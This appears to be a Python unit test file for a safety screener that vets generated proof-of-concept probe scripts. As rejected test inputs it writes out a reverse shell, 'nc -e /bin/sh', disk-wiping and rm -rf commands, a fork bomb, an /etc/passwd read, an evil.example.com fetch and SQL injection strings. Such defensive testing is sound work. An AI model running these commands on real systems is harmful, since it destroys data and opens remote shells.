"""Unit tests for static PoC safety screening and canary primitives."""

import pytest

from mugiwara.agents.poc_safety import (
    CANARY_PREFIX,
    TARGET_URL_ENV_VAR,
    gen_canary_token,
    screen_poc,
)


def test_gen_canary_token_unique_and_prefixed() -> None:
    """Verify tokens are unique and carry the Mugiwara prefix."""
    first = gen_canary_token()
    second = gen_canary_token()

    assert first.startswith(CANARY_PREFIX)
    assert second.startswith(CANARY_PREFIX)
    assert first != second


def test_screen_poc_accepts_minimal_benign_probe() -> None:
    """Verify a stdlib-only loopback probe referencing the env contract passes."""
    script = "\n".join(
        [
            "import json",
            "import os",
            "import urllib.request",
            f"url = os.environ['{TARGET_URL_ENV_VAR}']",
            "response = urllib.request.urlopen(url, timeout=5)",
            "body = response.read().decode('utf-8', 'replace')",
            "verdict = {'canary_found': 'x' in body}",
            "print('MUGIWARA_VERDICT: ' + json.dumps(verdict))",
        ]
    )

    result = screen_poc(script, max_bytes=16_384)

    assert result.allowed is True
    assert result.reasons == []


def test_screen_poc_rejects_oversized_script() -> None:
    """Verify scripts above the byte cap are rejected."""
    script = f"# {'a' * 100}\nprint(os.environ.get('{TARGET_URL_ENV_VAR}'))"

    result = screen_poc(script, max_bytes=64)

    assert result.allowed is False
    assert any("byte cap" in reason for reason in result.reasons)


def test_screen_poc_requires_target_url_reference() -> None:
    """Verify probes must honor the MUGIWARA_TARGET_URL contract."""
    result = screen_poc("import sys\nprint(sys.argv)\n", max_bytes=16_384)

    assert result.allowed is False
    assert any(TARGET_URL_ENV_VAR in reason for reason in result.reasons)


@pytest.mark.parametrize(
    "verb",
    ["DROP", "DELETE", "TRUNCATE", "ALTER", "UPDATE"],
)
def test_screen_poc_rejects_destructive_sql_verbs(verb: str) -> None:
    """Verify blanket denial of destructive SQL verbs including UPDATE/DELETE."""
    script = f"payload = '1 OR 1=1; {verb} FROM users'"

    result = screen_poc(script, max_bytes=16_384)

    assert result.allowed is False
    assert any("SQL verb" in reason for reason in result.reasons)


@pytest.mark.parametrize(
    ("snippet", "label"),
    [
        ("os.system('rm -rf /workspace')", "probe process execution"),
        ("import subprocess\nsubprocess.run(['id'])", "probe process execution"),
        ("open('/tmp/x', 'w').write('')\npopen('ls')", "probe process execution"),
        ("eval('2 + 2')", "probe dynamic evaluation"),
        ("exec(payload)", "probe dynamic evaluation"),
        ("import shutil\nshutil.rmtree('/tmp/x')", "disallowed import 'shutil'"),
        ("import socket\nsocket.socket()", "disallowed import 'socket'"),
        ("import requests\nrequests.get('http://127.0.0.1/')", "disallowed import 'requests'"),
    ],
)
def test_screen_poc_rejects_dangerous_probe_code(snippet: str, label: str) -> None:
    """Verify probe-code deny rules and the import allowlist."""
    script = f"import os\n{TARGET_URL_ENV_VAR} = os.environ.get('{TARGET_URL_ENV_VAR}')\n{snippet}"

    result = screen_poc(script, max_bytes=16_384)

    assert result.allowed is False
    assert any(label in reason for reason in result.reasons)


@pytest.mark.parametrize(
    ("snippet", "label"),
    [
        ("urllib.request.urlopen('http://evil.example.com/x')", "non-loopback URL"),
        ("target = 'http://10.0.0.5:8000/admin'", "non-loopback URL"),
        ("open('/etc/passwd').read()", None),
        ("import pathlib\npathlib.Path('/workspace').unlink(missing_ok=True)", "disallowed import"),
    ],
)
def test_screen_poc_rejects_egress_and_filesystem_threats(snippet: str, label: str | None) -> None:
    """Verify egress URLs and filesystem threats never pass screening."""
    script = f"import os\nurl = os.environ['{TARGET_URL_ENV_VAR}']\n{snippet}"

    result = screen_poc(script, max_bytes=16_384)

    assert result.allowed is False
    if label is not None:
        assert any(label in reason for reason in result.reasons)


@pytest.mark.parametrize(
    "snippet",
    [
        ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
        ("nc -e /bin/sh 127.0.0.1 4444"),
        ("shutdown -h now"),
        ("dd if=/dev/zero of=/dev/sda"),
        ("chmod 777 / "),
        (":(){ :|:& };:"),
    ],
)
def test_screen_poc_rejects_raw_hostile_constructs(snippet: str) -> None:
    """Verify reverse shells, process control, and destruction tools are denied."""
    script = f"# {TARGET_URL_ENV_VAR}\n{snippet}"

    result = screen_poc(script, max_bytes=16_384)

    assert result.allowed is False


def test_screen_poc_payload_strings_do_not_trigger_probe_call_rules() -> None:
    """Verify payloads riding inside quoted strings are not mistaken for probe calls."""
    script = (
        "import os\n"
        f"url = os.environ['{TARGET_URL_ENV_VAR}']\n"
        "body = 'eval(1) and exec(x)'  # payload text inside a string literal\n"
        "print(body)\n"
    )

    result = screen_poc(script, max_bytes=16_384)

    assert result.allowed is True


def test_screen_poc_collects_multiple_reasons() -> None:
    """Verify all violations are reported together, not fail-fast."""
    script = "import socket\nDROP TABLE users\n"

    result = screen_poc(script, max_bytes=8)

    assert result.allowed is False
    assert len(result.reasons) >= 3
